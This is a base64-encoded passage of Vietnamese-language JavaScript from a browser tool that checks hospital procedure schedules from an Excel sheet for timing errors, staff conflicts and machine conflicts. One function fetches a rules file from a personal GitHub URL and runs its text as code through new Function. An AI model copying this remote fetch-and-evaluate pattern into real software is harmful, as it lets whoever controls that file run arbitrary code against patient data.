ICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoYEtow7RuZyB0w6xtIHRo4bqleSBjw6FjIGPhu5l0IGLhuq90IGJ14buZYzogJHttaXNzaW5nQ29sdW1ucy5qb2luKCcsICcpfWApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCByb3dzID0gZGF0YS5zbGljZSg5KTsNCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gW107DQogICAgICAgICAgICAgICAgY29uc3QgaGVyYlByb2NlZHVyZXMgPSBbXTsNCiAgICAgICAgICAgICAgICBsZXQgc2tpcHBlZFJvd3MgPSAwOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICAgICAgICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignRMOybmcgdHLhu5FuZycsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSByb3dbcHJvY2VkdXJlSW5kZXhdOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoYFRo4bunIHRodeG6rXQga2jDtG5nIG7hurFtIHRyb25nIGRhbmggc8OhY2gga2nhu4NtIHRyYTogJHtwcm9jZWR1cmVOYW1lfWAsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLnNraXApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZXJiUHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93SW5kZXg6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQ/LmRhdGVLZXkgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kOiBlbmQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kPy5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFzdGFydCB8fCAhZW5kKSB7DQogICANCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0YXJ0LmRhdGVLZXkgIT09IGVuZC5kYXRlS2V5KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoJ1Ro4bunIHRodeG6rXQgYuG6r3QgxJHhuqd1IHbDoCBr4bq/dCB0aMO6YyBraMOhYyBuZ8OgeScsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydERhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZERhdGU6IGVuZC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlbmQuc2Vjb25kcyA8PSBzdGFydC5zZWNvbmRzKSB7DQogICAgbG9nRXJyb3IoJ1Ro4budaSBnaWFuIGvhur90IHRow7pjIHBo4bqjaSBzYXUgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1Jywgcm93TnVtYmVyLCB7DQogICAgICAgIHN0YXJ0VGltZTogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgIGVuZFRpbWU6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgc3RhcnRWYWx1ZTogcm93W3N0YXJ0SW5kZXhdLA0KICAgICAgICBlbmRWYWx1ZTogcm93W2VuZEluZGV4XSwNCiAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgbmdheVRodWNIaWVuOiBkYXRlSW5kZXggIT09IC0xID8gcm93W2RhdGVJbmRleF0gOiAnS2jDtG5nIHjDoWMgxJHhu4tuaCcNCiAgICB9KTsNCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhwZWN0ZWREdXJhdGlvbiA9IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0/LmR1cmF0aW9uIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBhY3R1YWxEdXJhdGlvbk1pbnV0ZXMgPSAoZW5kLnNlY29uZHMgLSBzdGFydC5zZWNvbmRzKSAvIDYwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQppZiAoZXhwZWN0ZWREdXJhdGlvbiA+IDAgJiYgTWF0aC5hYnMoYWN0dWFsRHVyYXRpb25NaW51dGVzIC0gZXhwZWN0ZWREdXJhdGlvbikgPj0gMSkgew0KICAgIGxvZ0Vycm9yKGBgLCByb3dOdW1iZXIsIHsNCiAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICBleHBlY3RlZDogZXhwZWN0ZWREdXJhdGlvbiwNCiAgICAgICAgYWN0dWFsOiBhY3R1YWxEdXJhdGlvbk1pbnV0ZXMsDQogICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdID8gcm93W29wZXJhdG9ySW5kZXhdLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICBuZ2F5VGh1Y0hpZW46IGRhdGVJbmRleCAhPT0gLTEgPyByb3dbZGF0ZUluZGV4XSA6ICdLaMO0bmcgeMOhYyDEkeG7i25oJywNCiAgICAgICAgc3RhcnRUaW1lOiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgZW5kVGltZTogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICBkb2N0b3I6IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIC8vIFRow6ptIGTDsm5nIG7DoHkNCiAgICB9KTsNCn0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocHJvY2VkdXJlTmFtZSA9PT0gJ1Phuq9jIHRodeG7kWMgdGhhbmcnKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVyYlByb2NlZHVyZXMucHVzaChwcm9jZWR1cmVzW3Byb2NlZHVyZXMubGVuZ3RoIC0gMV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dJbmRleDogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KCQkJCQkJCWRvY3Rvcjogcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQuZGF0ZUtleSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQuc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQ6IGVuZC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlTdGFydDogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0OiBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25mbGljdFJlYXNvbjogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWdnZXN0aW9uOiAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcihgTOG7l2kgeOG7rSBsw70gZMOybmc6ICR7ZXJyb3IubWVzc2FnZX1gLCByb3dOdW1iZXIsIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHJvd1twcm9jZWR1cmVJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yRGV0YWlsczogZXJyb3Iuc3RhY2sNCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChwcm9jZWR1cmVzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0tow7RuZyBjw7MgdGjhu6cgdGh14bqtdCBuw6BvIGjhu6NwIGzhu4cgxJHhu4Mga2nhu4NtIHRyYS4gVnVpIGzDsm5nIGtp4buDbSB0cmEgbOG6oWkgZOG7ryBsaeG7h3UuJyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGNoZWNrQ29uZmxpY3RzKHByb2NlZHVyZXMpOw0KICAgICAgICAgICAgICAgIGdlbmVyYXRlVGltZVN1Z2dlc3Rpb25zKHByb2NlZHVyZXMpOw0KCQkJCSAvLyA9PT0gVEjDik0gMyBEw5JORyBDaGVjayBtw6MgbcOheSA9PT0NCiAgICAgICAgY2hlY2tNYWNoaW5lRXJyb3JzKHByb2NlZHVyZXMsIGRhdGEpOw0KICAgICAgICBjaGVja01hY2hpbmVDb25mbGljdHMocHJvY2VkdXJlcywgZGF0YSk7DQoJCWNoZWNrTWlzc2luZ01hY2hpbmVDb2Rlcyhwcm9jZWR1cmVzLCBkYXRhKTsgDQogICAgICAgIC8vID09PSBL4bq+VCBUSMOaQyBUSMOKTSA9PT0NCiAgICAgICAgICAgICAgICBkaXNwbGF5UmVzdWx0cyhwcm9jZWR1cmVzLCBza2lwcGVkUm93cyk7DQogICAgICAgICAgICAgICAgd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzID0gaGVyYlByb2NlZHVyZXM7DQoJCQkJLy8gLS0tIEPhuq1wIG5o4bqtdCBz4buRIGNhIGtow6FjIMSRYSBz4buRIHRyw6puIG7DunQgLS0tDQpzZXRUaW1lb3V0KCgpID0+IHsNCiAgaWYgKHR5cGVvZiB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCA9PT0gJ2Z1bmN0aW9uJykgew0KICAgIHVwZGF0ZUhlcmJCdXR0b25XaXRoT3V0bGllckNvdW50KCk7DQogIH0NCn0sIDEwMCk7DQoNCiAgICAgICAgICAgICAgICBkaXNwbGF5RXJyb3JzKCk7DQoJCQkJIA0KICAgICAgICAvLyA9PT0gVEjDik0gMyBEw5JORyBjaGVjayBtw6MgbcOheSA9PT0NCiAgICAgICAgZGlzcGxheU1hY2hpbmVFcnJvcnMoKTsNCiAgICAgICAgZGlzcGxheU1hY2hpbmVDb25mbGljdHMoKTsNCgkJZGlzcGxheU1pc3NpbmdNYWNoaW5lRXJyb3JzKCk7DQogICAgICAgIC8vID09PSBL4bq+VCBUSMOaQyBUSMOKTSA9PT0NCiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICAgICAgbG9nRXJyb3IoZXJyb3IubWVzc2FnZSwgbnVsbCwgZXJyb3Iuc3RhY2spOw0KICAgICAgICAgICAgICAgIGRpc3BsYXlFcnJvcnMoKTsNCiAgICAgICAgICAgICAgICBhbGVydCgnQ8OzIGzhu5dpIHjhuqN5IHJhIGtoaSB44butIGzDvSBk4buvIGxp4buHdTogJyArIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCg0KbGV0IGNvbmZsaWN0UnVsZXNUZXh0ID0gJyc7DQoNCmFzeW5jIGZ1bmN0aW9uIGxvYWRDb25mbGljdFJ1bGVzKCkgew0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV94bHRodXRodWF0LnR4dD90cz0nICsgRGF0ZS5ub3coKTsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godXJsKTsNCiAgICAgICAgaWYgKCFyZXMub2spIHRocm93IG5ldyBFcnJvcignS2jDtG5nIHThuqNpIMSRxrDhu6NjIGNoYXVfeGx0aHV0aHVhdC50eHQnKTsNCiAgICAgICAgY29uZmxpY3RSdWxlc1RleHQgPSAoYXdhaXQgcmVzLnRleHQoKSkudHJpbSgpOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2kgdOG6o2kgY2hhdV94bHRodXRodWF0LnR4dDonLCBlKTsNCiAgICAgICAgY29uZmxpY3RSdWxlc1RleHQgPSAnJzsgLy8gZmFsbGJhY2s6IHLhu5duZyAtPiBjb2kgbmjGsCBraMO0bmcgY8OzIG5nb+G6oWkgbOG7hw0KICAgIH0NCn0NCg0KDQoNCg0KICAgICAgICBmdW5jdGlvbiBjaGVja0NvbmZsaWN0cyhwcm9jZWR1cmVzKSB7DQogICAgICAgICAgICBjb25zdCBpZ25vcmVBZGphY2VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZ25vcmVBZGphY2VudENoZWNrYm94JykuY2hlY2tlZDsNCiAgICAgICAgICAgIGNvbnN0IGdyb3VwcyA9IHt9Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgICAgICAgICAgY29uc3Qga2V5ID0gYCR7cHJvYy5vcGVyYXRvcn1fJHtwcm9jLmRhdGV9YDsNCiAgICAgICAgICAgICAgICBpZiAoIWdyb3Vwc1trZXldKSB7DQogICAgICAgICAgICAgICAgICAgIGdyb3Vwc1trZXldID0gW107DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgT2JqZWN0LnZhbHVlcyhncm91cHMpLmZvckVhY2goZ3JvdXAgPT4gew0KICAgICAgICAgICAgICAgIGdyb3VwLnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMTsgaSA8IGdyb3VwLmxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByZXYgPSBncm91cFtpIC0gMV07DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGN1cnJlbnQgPSBncm91cFtpXTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldkVuZFdpdGhCdWZmZXIgPSBwcmV2LmVuZCArIChwcmV2LnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaXNBZGphY2VudCA9IGlnbm9yZUFkamFjZW50ICYmIGN1cnJlbnQuc3RhcnQgPT09IHByZXYuZW5kOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgKGN1cnJlbnQuc3RhcnQgPCBwcmV2RW5kV2l0aEJ1ZmZlciAmJiAhaXNBZGphY2VudCkgew0KICAgICAgICAgICAgICAgICANCg0KbGV0IGlzQ29uZmxpY3QgPSB0cnVlOw0KICAgIHRyeSB7DQogICAgICAgIGlmIChjb25mbGljdFJ1bGVzVGV4dCAmJiBjb25mbGljdFJ1bGVzVGV4dC50cmltKCkpIHsNCiAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0Q29uZGl0aW9uID0gbmV3IEZ1bmN0aW9uKCdwcmV2JywnY3VycmVudCcsJ3JldHVybiAnICsgY29uZmxpY3RSdWxlc1RleHQudHJpbSgpKTsNCiAgICAgICAgICAgIC8vIGNvbmZsaWN0Q29uZGl0aW9uKCkgVFLhuqIgVuG7gCB0cnVlIG7hur91ICrEkcaw4bujYyBtaeG7hW4geHVuZyDEkeG7mXQqDQogICAgICAgICAgICBjb25zdCBhbGxvd2VkID0gY29uZmxpY3RDb25kaXRpb24ocHJldiwgY3VycmVudCk7DQogICAgICAgICAgICBpc0NvbmZsaWN0ID0gIWFsbG93ZWQ7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpc0NvbmZsaWN0ID0gdHJ1ZTsgLy8ga2jDtG5nIGPDsyBydWxlIC0+IGPhu6kgYsOhbyB4dW5nIMSR4buZdA0KICAgICAgICB9DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkcOhbmggZ2nDoSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbjonLCBlcnIpOw0KICAgICAgICBpc0NvbmZsaWN0ID0gdHJ1ZTsNCiAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc0NvbmZsaWN0KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudC5jb25mbGljdCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudC5jb25mbGljdFJlYXNvbiA9IGAke3ByZXYucHJvY2VkdXJlfTxicj7igKIgQuG7h25oIG5ow6JuOiAke3ByZXYucGF0aWVudE5hbWV9PGJyPuKAoiBOZ8OgeTogJHtwcmV2LmRhdGV9PGJyPuKAoiBUaOG7nWkgZ2lhbjogJHtwcmV2LmRpc3BsYXlTdGFydH0tJHtwcmV2LmRpc3BsYXlFbmR9YDsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZXYuY29uZmxpY3QgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcHJldi5jb25mbGljdFJlYXNvbi5pbmNsdWRlcyhjdXJyZW50LnByb2NlZHVyZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldi5jb25mbGljdFJlYXNvbiArPSAocHJldi5jb25mbGljdFJlYXNvbiA/ICc8YnI+PGJyPicgOiAnJykgKyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAgJHtjdXJyZW50LnByb2NlZHVyZX08YnI+4oCiIELhu4duaCBuaMOibjogJHtjdXJyZW50LnBhdGllbnROYW1lfTxicj7igKIgTmfDoHk6ICR7Y3VycmVudC5kYXRlfTxicj7igKIgVGjhu51pIGdpYW46ICR7Y3VycmVudC5kaXNwbGF5U3RhcnR9LSR7Y3VycmVudC5kaXNwbGF5RW5kfWA7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCg0KDQovLyBIw6BtIGtp4buDbSB0cmEgZ+G6r24gc2FpIG3DoXkNCmZ1bmN0aW9uIGNoZWNrTWFjaGluZUVycm9ycyhwcm9jZWR1cmVzLCBqc29uRGF0YSkgew0KICAgIG1hY2hpbmVFcnJvckxvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkgdHJvbmcgZmlsZSBFeGNlbCIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gVMOsbSBjw6FjIGPhu5l0IGtow6FjIGPhuqduIHRoaeG6v3QNCiAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQogICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgIGNvbnN0IGVuZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGvhur90IHRow7pjIikpOw0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIA0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1twcm9jZWR1cmVJbmRl